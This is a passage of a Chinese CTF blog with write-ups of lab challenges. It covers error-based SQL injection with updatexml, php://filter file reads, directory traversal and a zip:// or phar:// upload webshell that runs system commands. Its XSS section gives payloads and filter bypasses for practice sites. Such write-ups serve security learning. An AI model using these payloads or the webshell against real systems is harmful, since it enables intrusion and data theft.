<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~note~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>此处有一个大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;note&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~flag~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect flag from fl4g),1,32),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(50) &quot;XPATH syntax error: &#39;~n1book&#123;login_sqli_is_nice&#125;~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h1><p>考察：php://filter协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hello</span><br><span class="line"></span><br><span class="line">PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;hello world!&quot;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br><span class="line"></span><br><span class="line">PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0&#x3D;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    include (string)$_GET[&#39;p&#39;] . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&#39;Location: &#x2F;?p&#x3D;hello&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>猜测标的文件为flag，猜对了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;282cc63b-b61e-4ebd-a4b0-8081ec6a6c0f.node3.buuoj.cn&#x2F;?p&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</span><br><span class="line"></span><br><span class="line">PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">die(&#39;no no no&#39;);</span><br><span class="line">&#x2F;&#x2F;n1book&#123;afr_1_solved&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h1><p>考察：目录穿越</p>
<p>没有任何可以输入的点</p>
<p>看到图片目录为/img/img.gif</p>
<p>尝试URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img</span><br></pre></td></tr></table></figure>
<p>网页显示目录</p>
<p>尝试目录穿越</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;	</span><br></pre></td></tr></table></figure>
<p>看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;64aee20b-6186-413c-a12c-fd0df566fa9a.node3.buuoj.cn&#x2F;img..&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;afr_2_solved&#125;</span><br></pre></td></tr></table></figure>
<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;article</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;n1page</span><br><span class="line"></span><br><span class="line">&#39;&#x2F;home&#x2F;nu11111111l&#x2F;articles&#x2F;n1page&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;e814fea7-7a7d-42da-934c-bdb3b6caf1fb.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;flag</span><br><span class="line">no permission!</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" data-id="ckktdzeq90000lgusdt037abb" data-title="wp-CTFer成长之路-第一章" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTFer成长之路-1-3-3-文件读取漏洞例题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2021-02-05T00:52:51.000Z" itemprop="datePublished">2021-02-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/">CTFer成长之路_1.3.3 文件读取漏洞例题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-3-3-1-兵者多诡（HCTF-2016）"><a href="#1-3-3-1-兵者多诡（HCTF-2016）" class="headerlink" title="1.3.3.1 兵者多诡（HCTF 2016）"></a>1.3.3.1 兵者多诡（HCTF 2016）</h1><p>考察：zip://伪协议，phar伪协议</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Shinpachi8/article/details/53366980">https://blog.csdn.net/Shinpachi8/article/details/53366980</a></p>
<p>进入后，是一个文件上传页面，要求只能上传png格式图片</p>
<p>发现URL处有fp参数（意指 file pointer），尝试在此处使用伪协议导出php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload&#x2F;function</span><br></pre></td></tr></table></figure>
<p>分别导出function、upload、home</p>
<p>但是不知道flag的路径，需要上传一个木马</p>
<p>发现文件上传只对content-type进行了过滤，但是上传后的文件都会被命名为png，且随机改名</p>
<p><strong>方法1：zip伪协议</strong></p>
<p>创建一个php文件，内容为<?php \$\_GET\['param1'\](\$\_GET['param2']); ?></p>
<p>压缩php文件</p>
<p>上传后，假设拿到路径+文件名为xxx</p>
<p>发送请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
<p>可得到当前目录，之后对param1和param2进行修改即可</p>
<p><strong>方法2：phar协议</strong></p>
<p>创建一个php文件，内容为<?php print_r(scanf('/var/www')) ?></p>
<p>上传，假设拿到路径+文件名为xxx</p>
<p>发送请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>


<p>通过以上步骤得到flag文件路径，最后显示flag文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fp&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;Th1s_1s_F1a9</span><br></pre></td></tr></table></figure>
<h2 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;绝对路径%23要解压的文件&amp;参数1&#x3D;值1&amp;参数2&#x3D;值2</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
<h2 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;相对路径&#x2F;phar</span><br><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/05/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-1-3-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98/" data-id="ckktdzeqe0001lgus05g878a0" data-title="CTFer成长之路_1.3.3 文件读取漏洞例题" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/01/CTF-Web-XSS/" class="article-date">
  <time class="dt-published" datetime="2021-02-01T01:41:04.000Z" itemprop="datePublished">2021-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/01/CTF-Web-XSS/">CTF-Web-XSS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XSS靶机"><a href="#XSS靶机" class="headerlink" title="XSS靶机"></a>XSS靶机</h1><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">## 若执行了alert，则执行以下语句</span></span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:<span class="number">4</span>&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>观察到URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;test</span><br></pre></td></tr></table></figure>
<p>整个PHP文件只有URL处有输入空间，且test直接在下列语句中显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure>
<p>审计源码，直接显示test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>keyword在php中为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;keyword&quot; value&#x3D;&quot;test&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>审计源码，做了htmlspecialchars的过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br></pre></td></tr></table></figure>
<p>此处无法xss</p>
<p>还有一处用到了keyword</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>需要闭合尖括号和双引号，因此payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;xss&#x2F;level2.php?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="php的htmlspecialchars"><a href="#php的htmlspecialchars" class="headerlink" title="php的htmlspecialchars"></a>php的htmlspecialchars</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&amp;：转换为&amp;</span><br><span class="line">&quot;：转换为&quot;</span><br><span class="line">&#39;：转换为成为 &#39;</span><br><span class="line">&lt;：转换为&lt;</span><br><span class="line">&gt;：转换为&gt;</span><br><span class="line"></span><br><span class="line">ENT_COMPAT - 默认。仅编码双引号。</span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。</span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。</span><br></pre></td></tr></table></figure>


<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>需要绕过htmlspecialchars</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
<h3 id="onclick中使用javascript"><a href="#onclick中使用javascript" class="headerlink" title="onclick中使用javascript"></a>onclick中使用javascript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用js事件的onclick</span><br><span class="line">onclick&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;sad&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<h3 id="href中使用javascript"><a href="#href中使用javascript" class="headerlink" title="href中使用javascript"></a>href中使用javascript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;xxx&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>没有做大小写过滤</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>发现只替换了一次，可以双写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scripscriptt&gt;alert(1)&lt;&#x2F;scripscriptt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>考察：字符的html实体构造方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)</span><br></pre></td></tr></table></figure>
<h3 id="字符的html实体构造方法"><a href="#字符的html实体构造方法" class="headerlink" title="字符的html实体构造方法"></a>字符的html实体构造方法</h3><p>&amp;#+ascii码+;</p>
<p>如，表示s，用&amp;#115;（不要忘记分号）</p>
<p>即使js过滤了标签，后端接受到内容，依然会进行解码操作</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>错误尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&amp;#34;&amp;#62;&amp;#60;java&amp;#115;cript&amp;#62;alert(1)&amp;#60;&#x2F;java&amp;#115;cript&amp;#62;&amp;#60;</span><br></pre></td></tr></table></figure>
<p>正确payload</p>
<p>把http://注释掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;hi</span><br></pre></td></tr></table></figure>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>观察源码，需要通过get传递keyword和t_sort参数，其中t_sort为xss参数</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort&#x3D;333&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot; 333&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text &quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 下面是onclick在type后，但是不能alert</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&quot; type&#x3D;text οnclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这里一定要onclick在type的定义前，具体原因未知</p>
<h1 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS-game"></a>XSS-game</h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在输入框输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>尝试level1源码，不行，留言板为空</p>
<p>注意到fuzz测试中没有过滤任何字符</p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;2123&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>成功</p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>注意到没有地方输入，只有URL随着图片切换进行变化</p>
<p>改变URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level3&#x2F;frame#&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
<p>成功</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?timer&#x3D;3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;div&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;div&gt;</span><br></pre></td></tr></table></figure>


<h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>但输入框有长度限制</p>
<p>有两种方法</p>
<p>方法一，修改html中的最大长度限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input class&#x3D;&quot;xssr_in&quot; type&#x3D;&quot;text&quot; maxlength&#x3D;&quot;20&quot; name&#x3D;&quot;message&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>方法2，发现参数通过URL以get方式提交，故直接在URL处对参数进行赋值</p>
